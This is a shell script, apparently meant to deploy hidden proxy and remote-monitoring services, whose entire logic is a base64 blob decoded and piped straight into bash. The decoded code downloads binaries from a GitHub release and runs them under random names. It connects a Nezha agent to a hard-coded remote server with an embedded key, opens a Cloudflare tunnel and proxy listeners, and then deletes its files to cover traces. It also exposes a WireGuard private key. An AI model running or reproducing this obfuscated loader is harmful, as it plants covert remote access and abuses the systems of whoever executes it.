#!/usr/bin/env sh

echo "Z2VuZXJhdGVfcmFuZG9tX25hbWUoKSB7CiAgICBsb2NhbCBsZW5ndGg9JDEKICAgIG9wZW5zc2wgcmFuZCAtYmFzZTY0IDQ4IHwgdHIgLWRjICdhLXowLTknIHwgaGVhZCAtYyAiJGxlbmd0aCIKfQoKIyBHZW5lcmF0ZSB2YXJpYWJsZSBuYW1lcyBkeW5hbWljYWxseQpkZWNsYXJlIC1BIHZhcl9uYW1lcwp2YXJfbmFtZXM9KAogICAgWyJOWl9TUlYiXT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCiAgICBbIk5aX0tFWSJdPSQoZ2VuZXJhdGVfcmFuZG9tX25hbWUgOCkKICAgIFsiU1JWX1BPUlQiXT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCiAgICBbIlVJRCJdPSQoZ2VuZXJhdGVfcmFuZG9tX25hbWUgOCkKICAgIFsiVE5fRE9NIl09JChnZW5lcmF0ZV9yYW5kb21fbmFtZSA4KQogICAgWyJUTl9US04iXT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCiAgICBbIkNGX0FERFIiXT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCiAgICBbIkNGX1BPUlQiXT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCiAgICBbIklOU1RfTkFNRSJdPSQoZ2VuZXJhdGVfcmFuZG9tX25hbWUgOCkKICAgIFsiVE5fUFJUIl09JChnZW5lcmF0ZV9yYW5kb21fbmFtZSA4KQopCgojIEVudmlyb25tZW50IHZhcmlhYmxlcwpleHBvcnQgIiR7dmFyX25hbWVzW05aX1NSVl19Ij0iJHske3Zhcl9uYW1lc1tOWl9TUlZdfTotbmV6aGEubWluZ2ZlaTE5ODEuZXUub3JnOjQ0M30iCmV4cG9ydCAiJHt2YXJfbmFtZXNbTlpfS0VZXX0iPSIkeyR7dmFyX25hbWVzW05aX0tFWV19Oi1wUXc5ekdpTkNJN01QZFRjVkJ9IgpleHBvcnQgIiR7dmFyX25hbWVzW1NSVl9QT1JUXX0iPSIkeyR7dmFyX25hbWVzW1NSVl9QT1JUXX06LSR7UE9SVDotNzg2MH19IgpleHBvcnQgIiR7dmFyX25hbWVzW1VJRF19Ij0iJHske3Zhcl9uYW1lc1tVSURdfTotZmFhY2YxNDItZGVlOC00OGMyLTg1NTgtNjQxMTIzZWI5MzljfSIKZXhwb3J0ICIke3Zhcl9uYW1lc1tUTl9ET01dfSI9IiR7JHt2YXJfbmFtZXNbVE5fRE9NXX06LX0iCmV4cG9ydCAiJHt2YXJfbmFtZXNbVE5fVEtOXX0iPSIkeyR7dmFyX25hbWVzW1ROX1RLTl19Oi19IgpleHBvcnQgIiR7dmFyX25hbWVzW0NGX0FERFJdfSI9IiR7JHt2YXJfbmFtZXNbQ0ZfQUREUl19Oi1za2subW9lfSIKZXhwb3J0ICIke3Zhcl9uYW1lc1tDRl9QT1JUXX0iPSIkeyR7dmFyX25hbWVzW0NGX1BPUlRdfTotNDQzfSIKZXhwb3J0ICIke3Zhcl9uYW1lc1tJTlNUX05BTUVdfSI9IiR7JHt2YXJfbmFtZXNbSU5TVF9OQU1FXX06LU1KSn0iCmV4cG9ydCAiJHt2YXJfbmFtZXNbVE5fUFJUXX0iPSIkeyR7dmFyX25hbWVzW1ROX1BSVF19Oi04MDAxfSIKClJBTkRPTV9XRUJfTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpClJBTkRPTV9OUE1fTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpClJBTkRPTV9CT1RfTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCgpkb3dubG9hZF9maWxlKCkgewogICAgdXJsPSQxCiAgICBvdXRwdXQ9JDIKICAgIGN1cmwgLXNMICIkdXJsIiAtbyAiJG91dHB1dCIKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICAgIGVjaG8gIkZhaWxlZCB0byBkb3dubG9hZCAkb3V0cHV0LCBwbGVhc2UgY2hlY2sgdGhlIG5ldHdvcmsgY29ubmVjdGlvbiBhbmQgZG93bmxvYWQgbGluay4iCiAgICAgICAgZXhpdCAxCiAgICBmaQp9CgpBUkNIPSQodW5hbWUgLW0pCmlmIFsgIiRBUkNIIiA9PSAiYXJtIiBdIHx8IFsgIiRBUkNIIiA9PSAiYXJtNjQiIF0gfHwgWyAiJEFSQ0giID09ICJhYXJjaDY0IiBdOyB0aGVuCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hcm1zYiIgIiRSQU5ET01fV0VCX05BTUUiCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hcm02NGFnZW50IiAiJFJBTkRPTV9OUE1fTkFNRSIKICAgIGRvd25sb2FkX2ZpbGUgImh0dHBzOi8vZ2l0aHViLmNvbS9iYWJhbWExMDAxOTgwL2dvb2QvcmVsZWFzZXMvZG93bmxvYWQvbnBjL2FybTY0MmdvIiAiJFJBTkRPTV9CT1RfTkFNRSIKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hbWRzYiIgIiRSQU5ET01fV0VCX05BTUUiCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hbWQ2NGFnZW50IiAiJFJBTkRPTV9OUE1fTkFNRSIKICAgIGRvd25sb2FkX2ZpbGUgImh0dHBzOi8vZ2l0aHViLmNvbS9iYWJhbWExMDAxOTgwL2dvb2QvcmVsZWFzZXMvZG93bmxvYWQvbnBjL2FtZDY0MmdvIiAiJFJBTkRPTV9CT1RfTkFNRSIKZWxzZQogICAgZWNobyAiVW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiAkQVJDSCIKICAgIGV4aXQgMQpmaQoKY2htb2QgK3ggIiRSQU5ET01fV0VCX05BTUUiICIkUkFORE9NX05QTV9OQU1FIiAiJFJBTkRPTV9CT1RfTkFNRSIKCnsKICAgIG9wZW5zc2wgZWNwYXJhbSAtZ2Vua2V5IC1uYW1lIHByaW1lMjU2djEgLW91dCAicHJpdmF0ZS5rZXkiCiAgICBvcGVuc3NsIHJlcSAtbmV3IC14NTA5IC1kYXlzIDM2NTAwIC1rZXkgInByaXZhdGUua2V5IiAtb3V0ICJjZXJ0LnBlbSIgLXN1YmogIi9DTj1iaW5nLmNvbSIKfSA+IC9kZXYvbnVsbCAyPiYxCgp0dW5uZWxfY29uZmlndXJlKCkgewogIGlmIFtbIC16ICR7dmFyX25hbWVzW1ROX1RLTl19IHx8IC16ICR7dmFyX25hbWVzW1ROX0RPTV19IF1dOyB0aGVuCiAgICByZXR1cm4KICBmaQoKICBpZiBbWyAke3Zhcl9uYW1lc1tUTl9US05dfSA9fiBUdW5uZWxTZWNyZXQgXV07IHRoZW4KICAgIGVjaG8gIiR7dmFyX25hbWVzW1ROX1RLTl19IiA+IHR1bm5lbC5qc29uCiAgICBjYXQgPiB0dW5uZWwueW1sIDw8IEVPRgp0dW5uZWw6ICQoY3V0IC1kXCIgLWYxMiA8PDwgIiR7dmFyX25hbWVzW1ROX1RLTl19IikKY3JlZGVudGlhbHMtZmlsZTogdHVubmVsLmpzb24KcHJvdG9jb2w6IGh0dHAyCgppbmdyZXNzOgogIC0gaG9zdG5hbWU6ICR7dmFyX25hbWVzW1ROX0RPTV19CiAgICBzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiR7dmFyX25hbWVzW1ROX1BSVF19CiAgICBvcmlnaW5SZXF1ZXN0OgogICAgICBub1RMU1ZlcmlmeTogdHJ1ZQogIC0gc2VydmljZTogaHR0cF9zdGF0dXM6NDA0CkVPRgogIGZpCn0KdHVubmVsX2NvbmZpZ3VyZQoKY2F0ID4gY29uZmlnLmpzb24gPDxFT0wKewogICJsb2ciOiB7CiAgICAiZGlzYWJsZWQiOiB0cnVlLAogICAgImxldmVsIjogImluZm8iLAogICAgInRpbWVzdGFtcCI6IHRydWUKICB9LAogICJkbnMiOiB7CiAgICAic2VydmVycyI6IFsKICAgICAgewogICAgICAgICJ0YWciOiAiZ29vZ2xlIiwKICAgICAgICAiYWRkcmVzcyI6ICJ0bHM6Ly84LjguOC44IiwKICAgICAgICAic3RyYXRlZ3kiOiAiaXB2NF9vbmx5IiwKICAgICAgICAiZGV0b3VyIjogImRpcmVjdCIKICAgICAgfQogICAgXSwKICAgICJydWxlcyI6IFsKICAgICAgewogICAgICAgICJydWxlX3NldCI6IFsKICAgICAgICAgICJnZW9zaXRlLW9wZW5haSIKICAgICAgICBdLAogICAgICAgICJzZXJ2ZXIiOiAid2lyZWd1YXJkIgogICAgICB9LAogICAgICB7CiAgICAgICAgInJ1bGVfc2V0IjogWwogICAgICAgICAgImdlb3NpdGUtbmV0ZmxpeCIKICAgICAgICBdLAogICAgICAgICJzZXJ2ZXIiOiAid2lyZWd1YXJkIgogICAgICB9LAogICAgICB7CiAgICAgICAgInJ1bGVfc2V0IjogWwogICAgICAgICAgImdlb3NpdGUtY2F0ZWdvcnktYWRzLWFsbCIKICAgICAgICBdLAogICAgICAgICJzZXJ2ZXIiOiAiYmxvY2siCiAgICAgIH0KICAgIF0sCiAgICAiZmluYWwiOiAiZ29vZ2xlIiwKICAgICJzdHJhdGVneSI6ICIiLAogICAgImRpc2FibGVfY2FjaGUiOiBmYWxzZSwKICAgICJkaXNhYmxlX2V4cGlyZSI6IGZhbHNlCiAgfSwKICAiaW5ib3VuZHMiOiBbCiAgICB7CiAgICAgICJ0YWciOiAidm1lc3Mtd3MtaW4iLAogICAgICAidHlwZSI6ICJ2bWVzcyIsCiAgICAgICJsaXN0ZW4iOiAiOjoiLAogICAgICAibGlzdGVuX3BvcnQiOiAke3Zhcl9uYW1lc1tUTl9QUlRdfSwKICAgICAgInVzZXJzIjogWwogICAgICAgIHsKICAgICAgICAgICJ1dWlkIjogIiR7dmFyX25hbWVzW1VJRF19IgogICAgICAgIH0KICAgICAgXSwKICAgICAgInRyYW5zcG9ydCI6IHsKICAgICAgICAidHlwZSI6ICJ3cyIsCiAgICAgICAgInBhdGgiOiAiL3ZtZXNzLXR1bm5lbCIsCiAgICAgICAgImVhcmx5X2RhdGFfaGVhZGVyX25hbWUiOiAiU2VjLVdlYlNvY2tldC1Qcm90b2NvbCIKICAgICAgfQogICAgfSwKICAgIHsKICAgICAgICJ0YWciOiAiaHlzdGVyaWEtaW4iLAogICAgICAgInR5cGUiOiAiaHlzdGVyaWEyIiwKICAgICAgICJsaXN0ZW4iOiAiOjoiLAogICAgICAgImxpc3Rlbl9wb3J0IjogJHt2YXJfbmFtZXNbU1JWX1BPUlRdfSwKICAgICAgICJ1c2VycyI6IFsKICAgICAgICAgewogICAgICAgICAgICAgInBhc3N3b3JkIjogIiR7dmFyX25hbWVzW1VJRF19IgogICAgICAgICB9CiAgICAgICBdLAogICAgICAgIm1hc3F1ZXJhZGUiOiAiaHR0cHM6Ly9iaW5nLmNvbSIsCiAgICAgICAidGxzIjogewogICAgICAgICAiZW5hYmxlZCI6IHRydWUsCiAgICAgICAgICJhbHBuIjogWwogICAgICAgICAgICJoMyIKICAgICAgICAgXSwKICAgICAgICAgImNlcnRpZmljYXRlX3BhdGgiOiAiY2VydC5wZW0iLAogICAgICAgICAia2V5X3BhdGgiOiAicHJpdmF0ZS5rZXkiCiAgICAgICB9CiAgICB9CiAgXSwKICAib3V0Ym91bmRzIjogWwogICAgewogICAgICAidHlwZSI6ICJkaXJlY3QiLAogICAgICAidGFnIjogImRpcmVjdCIKICAgIH0sCiAgICB7CiAgICAgICJ0eXBlIjogImJsb2NrIiwKICAgICAgInRhZyI6ICJibG9jayIKICAgIH0sCiAgICB7CiAgICAgICJ0eXBlIjogImRucyIsCiAgICAgICJ0YWciOiAiZG5zLW91dCIKICAgIH0sCiAgICB7CiAgICAgICJ0eXBlIjogIndpcmVndWFyZCIsCiAgICAgICJ0YWciOiAid2lyZWd1YXJkLW91dCIsCiAgICAgICJzZXJ2ZXIiOiAiMTYyLjE1OS4xOTUuMTAwIiwKICAgICAgInNlcnZlcl9wb3J0IjogNDUwMCwKICAgICAgImxvY2FsX2FkZHJlc3MiOiBbCiAgICAgICAgIjE3Mi4xNi4wLjIvMzIiLAogICAgICAgICIyNjA2OjQ3MDA6MTEwOjgzYzc6YjMxZjo1ODU4OmIzYTg6YzZiMS8xMjgiCiAgICAgIF0sCiAgICAgICJwcml2YXRlX2tleSI6ICJtUFpvK1Y5cWxyTUdDWjcrRTZ6Mk5JNk5PVjM0UEQrK1RwQVIwOVB0Q1dJPSIsCiAgICAgICJwZWVyX3B1YmxpY19rZXkiOiAiYm1YT0MrRjFGeEVNRjlkeWlLMkg1LzFTVXR6SDBKdVZvNTFoMndQZmd5bz0iLAogICAgICAicmVzZXJ2ZWQiOiBbCiAgICAgICAgMjYsCiAgICAgICAgMjEsCiAgICAgICAgMjI4CiAgICAgIF0KICAgIH0KICBdLAogICJyb3V0ZSI6IHsKICAgICJydWxlcyI6IFsKICAgICAgewogICAgICAgICJwcm90b2NvbCI6ICJkbnMiLAogICAgICAgICJvdXRib3VuZCI6ICJkbnMtb3V0IgogICAgICB9LAogICAgICB7CiAgICAgICAgImlwX2lzX3ByaXZhdGUiOiB0cnVlLAogICAgICAgICJvdXRib3VuZCI6ICJkaXJlY3QiCiAgICAgIH0sCiAgICAgIHsKICAgICAgICAicnVsZV9zZXQiOiBbCiAgICAgICAgICAiZ2Vvc2l0ZS1vcGVuYWkiCiAgICAgICAgXSwKICAgICAgICAib3V0Ym91bmQiOiAid2lyZWd1YXJkLW91dCIKICAgICAgfSwKICAgICAgewogICAgICAgICJydWxlX3NldCI6IFsKICAgICAgICAgICJnZW9zaXRlLW5ldGZsaXgiCiAgICAgICAgXSwKICAgICAgICAib3V0Ym91bmQiOiAid2lyZWd1YXJkLW91dCIKICAgICAgfSwKICAgICAgewogICAgICAgICJydWxlX3NldCI6IFsKICAgICAgICAgICJnZW9zaXRlLWNhdGVnb3J5LWFkcy1hbGwiCiAgICAgICAgXSwKICAgICAgICAib3V0Ym91bmQiOiAiYmxvY2siCiAgICAgIH0KICAgIF0sCiAgICAicnVsZV9zZXQiOiBbCiAgICAgIHsKICAgICAgICAidGFnIjogImdlb3NpdGUtbmV0ZmxpeCIsCiAgICAgICAgInR5cGUiOiAicmVtb3RlIiwKICAgICAgICAiZm9ybWF0IjogImJpbmFyeSIsCiAgICAgICAgInVybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2FnZXJOZXQvc2luZy1nZW9zaXRlL3J1bGUtc2V0L2dlb3NpdGUtbmV0ZmxpeC5zcnMiLAogICAgICAgICJkb3dubG9hZF9kZXRvdXIiOiAiZGlyZWN0IgogICAgICB9LAogICAgICB7CiAgICAgICAgInRhZyI6ICJnZW9zaXRlLW9wZW5haSIsCiAgICAgICAgInR5cGUiOiAicmVtb3RlIiwKICAgICAgICAiZm9ybWF0IjogImJpbmFyeSIsCiAgICAgICAgInVybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTWV0YUN1YmVYL21ldGEtcnVsZXMtZGF0L3NpbmcvZ2VvL2dlb3NpdGUvb3BlbmFpLnNycyIsCiAgICAgICAgImRvd25sb2FkX2RldG91ciI6ICJkaXJlY3QiCiAgICAgIH0sCiAgICAgIHsKICAgICAgICAidGFnIjogImdlb3NpdGUtY2F0ZWdvcnktYWRzLWFsbCIsCiAgICAgICAgInR5cGUiOiAicmVtb3RlIiwKICAgICAgICAiZm9ybWF0IjogImJpbmFyeSIsCiAgICAgICAgInVybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2FnZXJOZXQvc2luZy1nZW9zaXRlL3J1bGUtc2V0L2dlb3NpdGUtY2F0ZWdvcnktYWRzLWFsbC5zcnMiLAogICAgICAgICJkb3dubG9hZF9kZXRvdXIiOiAiZGlyZWN0IgogICAgICB9CiAgICBdLAogICAgImZpbmFsIjogImRpcmVjdCIKICB9LAogICJleHBlcmltZW50YWwiOiB7CiAgICAiY2FjaGVfZmlsZSI6IHsKICAgICAgInBhdGgiOiAiY2FjaGUuZGIiLAogICAgICAiY2FjaGVfaWQiOiAibXljYWNoZWlkIiwKICAgICAgInN0b3JlX2Zha2VpcCI6IHRydWUKICAgIH0KICB9Cn0KRU9MCgouLyIkUkFORE9NX1dFQl9OQU1FIiBydW4gLWMgY29uZmlnLmpzb24gPiAvZGV2L251bGwgMj4mMSAmCm5vaHVwIC4vIiRSQU5ET01fTlBNX05BTUUiIC1zICIke3Zhcl9uYW1lc1tOWl9TUlZdfSIgLXAgIiR7dmFyX25hbWVzW05aX0tFWV19IiAtLXRscyA+IC9kZXYvbnVsbCAyPiYxICYKCmlmIFsgLWUgIiRSQU5ET01fQk9UX05BTUUiIF07IHRoZW4KICAgIGlmIFtbICR7dmFyX25hbWVzW1ROX1RLTl19ID1+IF5bQS1aMC05YS16PV17MTIwLDI1MH0kIF1dOyB0aGVuCiAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIHJ1biAtLXRva2VuICR7dmFyX25hbWVzW1ROX1RLTl19IgogICAgZWxpZiBbWyAke3Zhcl9uYW1lc1tUTl9US05dfSA9fiBUdW5uZWxTZWNyZXQgXV07IHRoZW4KICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1jb25maWcgdHVubmVsLnltbCBydW4iCiAgICBlbHNlCiAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIC0tbG9nZmlsZSBib290LmxvZyAtLWxvZ2xldmVsIGluZm8gLS11cmwgaHR0cDovL2xvY2FsaG9zdDoke3Zhcl9uYW1lc1tUTl9QUlRdfSIKICAgIGZpCiAgICBub2h1cCAuLyIkUkFORE9NX0JPVF9OQU1FIiAkYXJncyA+L2Rldi9udWxsIDI+JjEgJgogICAgc2xlZXAgMgpmaQoKZ2V0X3R1bmRvbWFpbigpIHsKICBpZiBbWyAtbiAke3Zhcl9uYW1lc1tUTl9US05dfSBdXTsgdGhlbgogICAgZWNobyAiJHt2YXJfbmFtZXNbVE5fRE9NXX0iCiAgZWxzZQogICAgbG9jYWwgcmV0cnk9MAogICAgbG9jYWwgbWF4X3JldHJpZXM9NgogICAgbG9jYWwgdHVuZG9tYWluPSIiCiAgICB3aGlsZSBbWyAkcmV0cnkgLWx0ICRtYXhfcmV0cmllcyBdXTsgZG8KICAgICAgKChyZXRyeSsrKSkKICAgICAgdHVuZG9tYWluPSQoc2VkIC1uICdzfC4qaHR0cHM6Ly9cKFteL10qdHJ5Y2xvdWRmbGFyZVwuY29tXCkuKnxcMXxwJyBib290LmxvZykKICAgICAgaWYgW1sgLW4gJHR1bmRvbWFpbiBdXTsgdGhlbgogICAgICAgIGJyZWFrCiAgICAgIGZpCiAgICAgIHNsZWVwIDEKICAgIGRvbmUKICAgIGVjaG8gIiR0dW5kb21haW4iCiAgZmkKfQoKdHVuZG9tYWluPSQoZ2V0X3R1bmRvbWFpbikKCnsKICAgIGlwdjQ9JChjdXJsIC1zIGlwdjQuaXAuc2IpCiAgICBpZiBbIC1uICIkaXB2NCIgXTsgdGhlbgogICAgICAgIEhPU1RfSVA9IiRpcHY0IgogICAgZWxzZQogICAgICAgIGlwdjY9JChjdXJsIC1zIC0tbWF4LXRpbWUgMSBpcHY2LmlwLnNiKQogICAgICAgIGlmIFsgLW4gIiRpcHY2IiBdOyB0aGVuCiAgICAgICAgICAgIEhPU1RfSVA9IiRpcHY2IgogICAgICAgIGVsc2UKICAgICAgICAgICAgZWNobyAiRmFpbGVkIHRvIGFjcXVpcmUgc2VydmVyIElQLCBleGl0aW5nLiIKICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgZmkKICAgIGZpCn0gPiAvZGV2L251bGwgMj4mMQoKSVNQPSQoY3VybCAtcyBodHRwczovL3NwZWVkLmNsb3VkZmxhcmUuY29tL21ldGEgfCBhd2sgLUZcIiAne3ByaW50ICQyNiItIiQxOH0nIHwgc2VkIC1lICdzLyAvXy9nJykKCmNhdCA8PCBFT0YgPiBzdWIudHh0Cmh5c3RlcmlhMjovLyR7dmFyX25hbWVzW1VJRF19QCRIT1NUX0lQOiR7dmFyX25hbWVzW1NSVl9QT1JUXX0vP3NuaT13d3cuYmluZy5jb20mYWxwbj1oMyZpbnNlY3VyZT0xIyRJU1AKdm1lc3M6Ly8kKGVjaG8gInsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwiJHt2YXJfbmFtZXNbSU5TVF9OQU1FXX0tJElTUFwiLCBcImFkZFwiOiBcIiR7dmFyX25hbWVzW0NGX0FERFJdfVwiLCBcInBvcnRcIjogXCIke3Zhcl9uYW1lc1tDRl9QT1JUXX1cIiwgXCJpZFwiOiBcIiR7dmFyX25hbWVzW1VJRF19XCIsIFwiYWlkXCI6IFwiMFwiLCBcInNjeVwiOiBcIm5vbmVcIiwgXCJuZXRcIjogXCJ3c1wiLCBcInR5cGVcIjogXCJub25lXCIsIFwiaG9zdFwiOiBcIiR0dW5kb21haW5cIiwgXCJwYXRoXCI6IFwiL3ZtZXNzLXR1bm5lbD9lZD0yMDQ4XCIsIFwidGxzXCI6IFwidGxzXCIsIFwic25pXCI6IFwiJHR1bmRvbWFpblwiLCBcImFscG5cIjogXCJcIiwgXCJmcFwiOiBcIlwifSIgfCBiYXNlNjQgLXcwKQpFT0YKCmJhc2U2NCAtdzAgc3ViLnR4dCA+IHN1Yl9lbmNvZGVkLnR4dAptdiBzdWJfZW5jb2RlZC50eHQgc3ViLnR4dAoKcm0gLXJmICIkUkFORE9NX1dFQl9OQU1FIiAiJFJBTkRPTV9OUE1fTkFNRSIgIiRSQU5ET01fQk9UX05BTUUiIGNvbmZpZy5qc29uIHByaXZhdGUua2V5IGNlcnQucGVtIGJvb3QubG9nIHR1bm5lbC5qc29uIHR1bm5lbC55bWwgc3ViLnR4dAoKCnRhaWwgLWYgL2Rldi9udWxs" | base64 -d | bash
